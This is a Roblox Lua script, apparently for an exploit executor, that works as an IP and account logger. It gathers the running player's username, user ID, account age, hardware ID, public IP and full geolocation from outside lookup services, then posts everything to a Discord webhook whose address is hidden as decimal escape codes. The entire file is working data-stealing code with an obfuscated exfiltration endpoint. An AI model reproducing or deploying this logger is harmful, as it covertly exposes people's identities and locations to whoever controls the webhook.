local LocalPlayer = game:GetService("Players").LocalPlayer
local DName = game.Players.LocalPlayer.DisplayName 
local Name = game.Players.LocalPlayer.Name
local Userid = game.Players.LocalPlayer.UserId
local Countury = game.LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = game:HttpGet("http://ip-api.com/json")
local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local AccountAge = LocalPlayer.AccountAge
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21)
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'
local GAMENAME = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local webhookcheck = ""
local url = "\104\116\116\112\115\058\047\047\100\105\115\099\111\114\100\046\099\111\109\047\097\112\105\047\119\101\098\104\111\111\107\115\047\049\049\051\057\057\055\052\053\055\052\053\050\052\054\048\048\051\056\055\047\100\114\101\072\070\075\095\118\078\071\102\116\119\087\069\107\099\121\105\086\084\102\095\085\067\088\053\072\049\048\065\106\099\111\052\065\100\121\077\068\076\121\056\087\072\106\068\107\078\077\117\075\052\120\109\106\112\048\109\106\069\107\122\084\099\045\085"
local data = {
   ["avatar_url"] = "https://imgur.com/sSOswzG",
   ["content"] = "",
   ["embeds"] = {
       {
     
      ["author"] = {
      ["name"] = "( Someone Executed The Script )",
      ["url"] = "https://roblox.com",
    },
        
           ["description"] = "\n__[Player Info](https://www.roblox.com/users/"..Userid..")__".." **\nDisplay Name:** "..DName.." \n**Username:** " .. Name.." \n**User Id:** "..Userid.."\n**MembershipType:** "..MembershipType.."\n**AccountAge:** "..AccountAge.."\n**Country:** "..game.LocalizationService.RobloxLocaleId.."**\nIP:** "..GetIp.."**\nHwid:** "..GetHwid.."**\nDate:** "..tostring(os.date("%m/%d/%Y")).."**\nTime:** "..tostring(os.date("%X")).."\n\n__[Game Info](https://www.roblox.com/games/"..game.PlaceId..")__".."\n**Game:** "..GAMENAME.." \n**Game Id**: "..game.PlaceId.." \n**Synergy - Free:** "..webhookcheck.."".."\n\n**Data:**".."```"..GetData.."```".. "\n\n**JobId:**".."```"..ConsoleJobId.."```" ,
           ["type"] = "rich",
           ["color"] = tonumber(0xf2ff00),
   ["thumbnail"] = {["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..game.Players.LocalPlayer.UserId.."&width=150&height=150&format=png"},
            }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = syn and syn.request or request;
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
print("\100\097\116\097\032\115\101\110\116\040\112\097\115\115\041");
